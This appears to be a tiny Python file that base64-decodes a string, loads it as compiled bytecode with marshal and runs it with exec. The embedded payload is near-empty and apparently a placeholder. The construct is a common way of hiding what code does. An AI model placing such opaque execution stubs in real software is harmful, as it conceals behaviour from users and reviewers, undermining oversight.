import base64
import marshal

_code = "4wAAAAAAAAAAAA=="
exec(marshal.loads(base64.b64decode(_code)))
